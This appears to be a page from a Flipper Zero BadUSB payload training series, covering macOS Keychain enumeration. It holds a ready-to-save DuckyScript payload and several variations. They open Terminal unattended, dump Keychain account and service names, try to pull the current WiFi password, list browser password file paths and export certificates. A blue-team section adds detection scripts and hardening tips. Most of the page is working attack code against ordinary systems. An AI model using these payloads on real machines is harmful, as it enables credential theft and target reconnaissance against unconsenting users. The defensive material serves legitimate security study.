# FZ-I10: macOS Keychain Query

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I10 |
| **Name** | macOS Keychain Query |
| **Difficulty** | Intermediate |
| **Target OS** | macOS 10.14+ |
| **Execution Time** | ~8 seconds |
| **Output** | /tmp/keychain.txt |
| **MITRE ATT&CK** | T1555.001 (Keychain) |

## What This Payload Does

Queries the macOS Keychain for stored credentials and secrets. The Keychain stores WiFi passwords, website credentials, certificates, and secure notes. Note: Most sensitive items require user password confirmation.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: macOS Keychain Query
REM Target: macOS 10.14+
REM Action: Queries keychain items
REM Output: /tmp/keychain.txt
REM Skill: Intermediate
REM NOTE: Many items require password prompt
REM =============================================

DELAY 3000

REM Open Terminal via Spotlight
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500

REM Query keychain (listing, not passwords)
STRINGLN echo "=== KEYCHAIN QUERY ===" > /tmp/keychain.txt
STRINGLN echo "Generated: $(date)" >> /tmp/keychain.txt
STRINGLN echo "" >> /tmp/keychain.txt

REM List all keychains
STRINGLN echo "=== KEYCHAINS ===" >> /tmp/keychain.txt
STRINGLN security list-keychains >> /tmp/keychain.txt

REM List generic passwords (names only)
STRINGLN echo "" >> /tmp/keychain.txt
STRINGLN echo "=== GENERIC PASSWORDS ===" >> /tmp/keychain.txt
STRINGLN security dump-keychain | grep -A 5 "class: genp" >> /tmp/keychain.txt 2>/dev/null

REM List internet passwords (names only)
STRINGLN echo "" >> /tmp/keychain.txt
STRINGLN echo "=== INTERNET PASSWORDS ===" >> /tmp/keychain.txt
STRINGLN security dump-keychain | grep -A 5 "class: inet" >> /tmp/keychain.txt 2>/dev/null

REM WiFi networks (requires root for passwords)
STRINGLN echo "" >> /tmp/keychain.txt
STRINGLN echo "=== WIFI NETWORKS ===" >> /tmp/keychain.txt
STRINGLN networksetup -listpreferredwirelessnetworks en0 >> /tmp/keychain.txt 2>/dev/null
```

---

## Understanding macOS Keychain

### Keychain Locations

| Keychain | Location | Contents |
|----------|----------|----------|
| Login | ~/Library/Keychains/login.keychain-db | User credentials |
| System | /Library/Keychains/System.keychain | System-wide certs |
| Local Items | iCloud Keychain data | Synced passwords |

### Item Classes

| Class | Code | Contents |
|-------|------|----------|
| Generic Password | genp | App passwords, secure notes |
| Internet Password | inet | Website/server credentials |
| Certificate | cert | Digital certificates |
| Key | keys | Encryption keys |
| Identity | idnt | Certificate + private key |

---

## Keychain Commands

### List Items (No Passwords)

```bash
# Dump keychain structure
security dump-keychain

# Dump specific keychain
security dump-keychain login.keychain

# Find generic passwords
security dump-keychain | grep -A 10 "class: genp"

# Find internet passwords
security dump-keychain | grep -A 10 "class: inet"
```

### Get Specific Password (Prompts User!)

```bash
# Get WiFi password (prompts for user password)
security find-generic-password -ga "WiFiNetworkName" 2>&1 | grep password

# Get website password (prompts for user password)
security find-internet-password -ga "example.com" 2>&1 | grep password
```

### List Certificates

```bash
# List all certificates
security find-certificate -a

# Find specific certificate
security find-certificate -c "Certificate Name"

# Export certificate
security export -k login.keychain -t certs -o ~/certs.pem
```

---

## Payload Variations

### Version 1: WiFi Password Extraction (Prompts User)

```ducky
STRINGLN SSID=$(networksetup -getairportnetwork en0 | cut -d: -f2 | xargs)
STRINGLN security find-generic-password -ga "$SSID" 2>&1 | grep password > /tmp/current_wifi.txt
REM This will show a password prompt to the user!
```

### Version 2: All Stored Accounts

```ducky
STRINGLN security dump-keychain 2>/dev/null | grep -E '(acct|svce|srvr)' | head -100 > /tmp/accounts.txt
```

### Version 3: Certificates Inventory

```ducky
STRINGLN security find-certificate -a 2>/dev/null | grep "alis" | sort -u > /tmp/certs.txt
```

### Version 4: Browser Passwords Location

```ducky
STRINGLN echo "Chrome: ~/Library/Application Support/Google/Chrome/Default/Login Data" > /tmp/browser_paths.txt
STRINGLN echo "Safari: ~/Library/Safari (uses Keychain)" >> /tmp/browser_paths.txt
STRINGLN echo "Firefox: ~/Library/Application Support/Firefox/Profiles/*.default/logins.json" >> /tmp/browser_paths.txt
```

---

## Cross-Platform Credential Storage

### Windows (For Comparison)

```powershell
# Windows Credential Manager
cmdkey /list

# DPAPI protected credentials
# Located in: %APPDATA%\Microsoft\Credentials
```

### Linux (For Comparison)

```bash
# GNOME Keyring
secret-tool search --all

# KDE Wallet
kwallet-query kdewallet
```

### Android

```bash
# Android Keystore (requires root)
# Located in: /data/misc/keystore/
```

### iOS

iOS Keychain is hardware-backed and completely inaccessible via BadUSB attacks.

---

## macOS Security Considerations

### What BadUSB Can Access

| Item | Accessible | Notes |
|------|-----------|-------|
| Keychain item names | Yes | No password needed |
| Account names | Yes | Visible in dump |
| Service names | Yes | Shows what's stored |
| WiFi network list | Yes | Names only |
| Actual passwords | No* | Requires user password |
| Certificates | Partial | Public info only |

*Unless user has modified default keychain security settings.

### macOS Protections

1. **Password Prompts**: Accessing passwords triggers system prompt
2. **Access Control Lists**: Items can restrict which apps access them
3. **TCC (Transparency, Consent, Control)**: Additional permission system
4. **Keychain Lock**: Keychain can be locked requiring password to unlock

---

## Red Team Perspective

### What's Achievable

| Goal | Feasibility | Notes |
|------|-------------|-------|
| Inventory accounts | High | Names/services visible |
| Get passwords | Low | User must enter password |
| Export certificates | Medium | Public certs accessible |
| Identify targets | High | See what services are used |

### Attack Chain

```
Keychain Inventory → Identify Targets → Social Engineering / Other Attacks
         ↑
     You are here
```

### Valuable Information

Even without passwords, the keychain dump reveals:
- What services/websites the user has accounts for
- Email addresses and usernames
- Corporate services in use
- VPN configurations
- Development tools (SSH keys, API credentials)

---

## Blue Team Perspective

### Detection Opportunities

1. **Terminal Launch**
   - Spotlight → Terminal is unusual pattern
   - Look for automated terminal sessions

2. **Security Command Usage**
   - `security dump-keychain`
   - `security find-generic-password`
   - `security find-internet-password`

3. **File Creation**
   - New files in /tmp with keychain content
   - Files containing credential patterns

### Detection Script

```bash
#!/bin/bash
# Monitor for keychain access
log stream --predicate 'subsystem == "com.apple.securityd"' --level info | while read line; do
    if echo "$line" | grep -q "dump-keychain\|find-.*-password"; then
        echo "ALERT: Keychain access detected - $line"
    fi
done
```

### macOS Unified Log Query

```bash
# Search for security command usage
log show --predicate 'process == "security"' --last 1h

# Search for keychain access
log show --predicate 'subsystem == "com.apple.securityd"' --last 1h
```

### Prevention

1. **Keychain Settings**
   - Require password after sleep
   - Shorter auto-lock timeout
   - Don't store sensitive items in login keychain

2. **Access Controls**
   - Set ACLs on sensitive keychain items
   - Require password for all password retrievals

3. **Monitoring**
   - Monitor Terminal/security command usage
   - Alert on keychain enumeration

---

## Practice Exercises

### Exercise 1: List Keychains
View all keychains on the system:
```ducky
STRINGLN security list-keychains
```

### Exercise 2: Count Stored Items
Count how many passwords are stored:
```ducky
STRINGLN security dump-keychain 2>/dev/null | grep -c "class: genp"
```

### Exercise 3: Find Specific Service
Check if credentials exist for a service:
```ducky
STRINGLN security dump-keychain 2>/dev/null | grep -i "github"
```

---

## Payload File

Save as `FZ-I10_macOS_Keychain.txt`:

```ducky
REM FZ-I10: macOS Keychain Query
DELAY 3000
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN {echo "=== KEYCHAIN ===";security list-keychains;echo "";security dump-keychain 2>/dev/null|grep -E "(class|acct|svce|srvr)"|head -100} > /tmp/keychain.txt
```

---

[← FZ-I09 Registry Persistence](FZ-I09_Registry_Persistence.md) | [Back to Intermediate](README.md) | [Next: FZ-I11 Android Recon →](FZ-I11_Android_Recon.md)
